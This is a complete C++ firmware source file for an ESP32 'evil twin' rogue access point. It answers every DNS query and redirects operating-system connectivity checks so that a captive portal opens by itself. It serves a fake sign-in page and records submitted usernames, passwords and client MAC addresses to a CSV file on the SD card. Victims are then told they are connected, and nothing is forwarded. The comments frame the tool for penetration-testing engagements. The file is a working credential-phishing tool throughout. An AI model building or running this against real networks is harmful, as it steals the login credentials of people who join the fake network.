/**
 * @file evil_twin.cpp
 * @brief See evil_twin.h.
 */
#include "evil_twin.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD_MMC.h>
#include <esp_wifi.h>
#include <cstring>
#include <cstdio>

namespace {

static WebServer* s_http = nullptr;
static DNSServer* s_dns  = nullptr;

static TwinClient  s_cl[EvilTwin::MAX_CLIENTS];
static int         s_cl_n = 0;
static TwinCapture s_cap[EvilTwin::MAX_CAPTURES];
static int         s_cap_n = 0;

static uint32_t    s_requests = 0;
static uint16_t    s_submits  = 0;
static char        s_portal_path[64] = {0};
static bool        s_sd_ok = false;

static const IPAddress AP_IP(172, 17, 1, 1);

/* A deliberately plain fallback so a missing template does not stop a test.
 * Real engagements supply their own pretext in /portal/<name>.html. */
static const char FALLBACK[] =
    "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
    "<title>Sign in</title>"
    "<style>body{font:16px system-ui;margin:0;padding:2em;background:#f4f4f6;color:#111}"
    "form{max-width:20em;margin:auto;background:#fff;padding:1.5em;border-radius:8px}"
    "input{width:100%;padding:.7em;margin:.4em 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}"
    "button{width:100%;padding:.8em;margin-top:.6em;border:0;border-radius:4px;background:#0a58ca;color:#fff;font-size:1em}"
    "h2{margin:0 0 .6em}</style>"
    "<form method=POST action=/login><h2>Sign in to continue</h2>"
    "<input name=u placeholder='Username' autocomplete=username>"
    "<input name=p type=password placeholder='Password' autocomplete=current-password>"
    "<button>Connect</button></form>";

/* ── capture log ─────────────────────────────────────────────────────── */

static void csv_field(char* out, int n, const char* in)
{
    int j = 0;
    if (j < n - 1) out[j++] = '"';
    for (int i = 0; in[i] && j < n - 3; i++) {
        if (in[i] == '"') { out[j++] = '"'; if (j < n - 3) out[j++] = '"'; }
        else out[j++] = in[i];
    }
    if (j < n - 1) out[j++] = '"';
    out[j] = '\0';
}

static void log_capture(const TwinCapture& c, const char* ssid)
{
    /* Decide on the header BEFORE opening: File::size() on a FILE_APPEND
     * handle does not reliably report 0 for a new file here, which is why the
     * first captures.csv came out with no header row at all. */
    bool need_header = !SD_MMC.exists("/portal/captures.csv");
    File f = SD_MMC.open("/portal/captures.csv", FILE_APPEND);
    if (!f) { s_sd_ok = false; return; }
    if (need_header || f.size() == 0)
        f.print("ms,ssid,client_mac,field1,field2\n");

    char f1[112], f2[112], ss[80], line[400];
    csv_field(f1, sizeof(f1), c.field1);
    csv_field(f2, sizeof(f2), c.field2);
    csv_field(ss, sizeof(ss), ssid ? ssid : "");
    int n = snprintf(line, sizeof(line),
                     "%lu,%s,%02X:%02X:%02X:%02X:%02X:%02X,%s,%s\n",
                     (unsigned long)c.ms, ss,
                     c.mac[0], c.mac[1], c.mac[2], c.mac[3], c.mac[4], c.mac[5],
                     f1, f2);
    f.write((const uint8_t*)line, n);
    f.close();
    s_sd_ok = true;
}

/* Best-effort: map the requesting IP back to an associated station MAC. */
static void client_mac_for(const IPAddress& ip, uint8_t out[6])
{
    memset(out, 0, 6);
    wifi_sta_list_t sta;
    if (esp_wifi_ap_get_sta_list(&sta) != ESP_OK) return;
    tcpip_adapter_sta_list_t list;
    if (tcpip_adapter_get_sta_list(&sta, &list) != ESP_OK) return;
    for (int i = 0; i < list.num; i++)
        if (IPAddress(list.sta[i].ip.addr) == ip) {
            memcpy(out, list.sta[i].mac, 6);
            return;
        }
}

/* ── HTTP handlers ───────────────────────────────────────────────────── */

static void send_portal()
{
    s_requests++;
    if (s_portal_path[0] && SD_MMC.exists(s_portal_path)) {
        File f = SD_MMC.open(s_portal_path, FILE_READ);
        if (f) {
            s_http->streamFile(f, "text/html");
            f.close();
            return;
        }
    }
    s_http->send(200, "text/html", FALLBACK);
}

static void handle_login()
{
    s_requests++;

    TwinCapture c{};
    c.ms = millis();
    client_mac_for(s_http->client().remoteIP(), c.mac);

    /* Take the first two non-empty args in order, whatever the template named
     * them, so a custom pretext does not need firmware changes. */
    int taken = 0;
    for (int i = 0; i < s_http->args() && taken < 2; i++) {
        String v = s_http->arg(i);
        if (!v.length()) continue;
        char* dst = taken == 0 ? c.field1 : c.field2;
        snprintf(dst, 48, "%s", v.c_str());
        taken++;
    }

    if (taken) {
        if (s_cap_n < EvilTwin::MAX_CAPTURES) s_cap[s_cap_n++] = c;
        else {
            for (int i = 1; i < EvilTwin::MAX_CAPTURES; i++) s_cap[i - 1] = s_cap[i];
            s_cap[EvilTwin::MAX_CAPTURES - 1] = c;
        }
        s_submits++;
        for (int i = 0; i < s_cl_n; i++)
            if (!memcmp(s_cl[i].mac, c.mac, 6)) s_cl[i].submitted = 1;
        log_capture(c, WiFi.softAPSSID().c_str());
    }

    /* A believable ending: tell them it worked. Nothing is forwarded. */
    s_http->send(200, "text/html",
        "<!doctype html><meta name=viewport content='width=device-width,initial-scale=1'>"
        "<title>Connected</title><body style=\"font:16px system-ui;padding:2em;text-align:center\">"
        "<h2>You're connected</h2><p>You may now browse.</p>");
}

/* Every OS has its own connectivity check; answering them all with a redirect
 * is what makes the portal sheet pop up by itself. */
static void handle_any()
{
    s_requests++;
    s_http->sendHeader("Location", String("http://") + AP_IP.toString() + "/", true);
    s_http->send(302, "text/plain", "");
}

} // namespace

bool EvilTwin::begin(const char* ssid, const char* portal, uint8_t channel)
{
    if (!ssid || !ssid[0]) return false;
    stop();

    s_cl_n = 0; s_cap_n = 0; s_requests = 0; s_submits = 0;
    s_portal_path[0] = '\0';
    s_sd_ok = false;          /* the probe below sets the real value */

    SD_MMC.mkdir("/portal");   /* exists() is unreliable on dirs; just create */
    if (portal && portal[0])
        snprintf(s_portal_path, sizeof(s_portal_path), "/portal/%s.html", portal);

    /* Probe the capture log NOW. Waiting until the first submission meant the
     * status screen showed [SD!] on every fresh start, which reads as "the
     * card is broken" when it only means "nobody has submitted yet". */
    {
        /* Probe writability without creating captures.csv — creating it here
         * would make log_capture() think the header was already written. */
        File probe = SD_MMC.open("/portal/.wtest", FILE_WRITE);
        if (probe) {
            probe.write((const uint8_t*)"1", 1);
            probe.close();
            SD_MMC.remove("/portal/.wtest");
            s_sd_ok = true;
        } else {
            s_sd_ok = false;
        }
    }

    _stats = TwinStats{};
    snprintf(_stats.ssid, sizeof(_stats.ssid), "%s", ssid);
    snprintf(_stats.portal, sizeof(_stats.portal), "%s",
             (portal && portal[0]) ? portal : "built-in");
    _stats.channel = (channel >= 1 && channel <= 13) ? channel : 1;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
    if (!WiFi.softAP(ssid, nullptr, _stats.channel, 0 /*visible*/, MAX_CLIENTS))
        return false;

    s_dns = new DNSServer();
    if (s_dns) { s_dns->setTTL(0); s_dns->start(53, "*", AP_IP); }

    s_http = new WebServer(80);
    if (!s_http) { stop(); return false; }
    s_http->on("/",      HTTP_GET,  send_portal);
    /* Accept both conventions. "/get" is what the Flipper Evil Portal template
     * ecosystem posts to — every template checked used it — and a page written
     * for that would otherwise fall through to onNotFound, get a 302, and
     * capture nothing. Field names vary wildly between templates
     * (email/password, uname/psw, JS-built queries), which is why the handler
     * takes the first two non-empty arguments in order rather than looking for
     * particular names. */
    s_http->on("/get",   HTTP_GET,  handle_login);
    s_http->on("/get",   HTTP_POST, handle_login);
    s_http->on("/login", HTTP_GET,  handle_login);
    s_http->on("/login", HTTP_POST, handle_login);
    s_http->onNotFound(handle_any);
    s_http->begin();

    _running = true;
    _stats.running = true;
    _last_tick = millis();
    return true;
}

void EvilTwin::stop()
{
    if (s_http) { s_http->stop(); delete s_http; s_http = nullptr; }
    if (s_dns)  { s_dns->stop();  delete s_dns;  s_dns  = nullptr; }
    if (_running) {
        WiFi.softAPdisconnect(true);
        WiFi.mode(WIFI_STA);
    }
    _running = false;
    _stats.running = false;
    _stats.clients = 0;
}

void EvilTwin::_refresh_clients()
{
    wifi_sta_list_t sta;
    if (esp_wifi_ap_get_sta_list(&sta) != ESP_OK) return;

    /* keep submitted flags for MACs we already know */
    for (int i = 0; i < sta.num && i < MAX_CLIENTS; i++) {
        bool known = false;
        for (int k = 0; k < s_cl_n; k++)
            if (!memcmp(s_cl[k].mac, sta.sta[i].mac, 6)) { known = true; break; }
        if (!known && s_cl_n < MAX_CLIENTS) {
            TwinClient* c = &s_cl[s_cl_n++];
            memcpy(c->mac, sta.sta[i].mac, 6);
            c->joined_ms = millis();
            c->submitted = 0;
            _stats.seen++;
        }
    }
    _stats.clients = (uint16_t)sta.num;
}

void EvilTwin::loop()
{
    if (!_running) return;
    if (s_dns)  s_dns->processNextRequest();
    if (s_http) s_http->handleClient();

    const uint32_t now = millis();
    if (now - _last_tick >= 1000) {
        _last_tick = now;
        _refresh_clients();
        _stats.requests = s_requests;
        _stats.submits  = s_submits;
        _stats.sd_ok    = s_sd_ok;
    }
}

int EvilTwin::clients(TwinClient* out, int max) const
{
    if (!out || max <= 0) return 0;
    int n = s_cl_n < max ? s_cl_n : max;
    for (int i = 0; i < n; i++) out[i] = s_cl[i];
    return n;
}

int EvilTwin::captures(TwinCapture* out, int max) const
{
    if (!out || max <= 0) return 0;
    int n = s_cap_n < max ? s_cap_n : max;
    for (int i = 0; i < n; i++) out[i] = s_cap[s_cap_n - 1 - i];   /* newest first */
    return n;
}

void EvilTwin::clear_captures()
{
    s_cap_n = 0;
    s_submits = 0;
    _stats.submits = 0;
    if (SD_MMC.exists("/portal/captures.csv")) SD_MMC.remove("/portal/captures.csv");
}
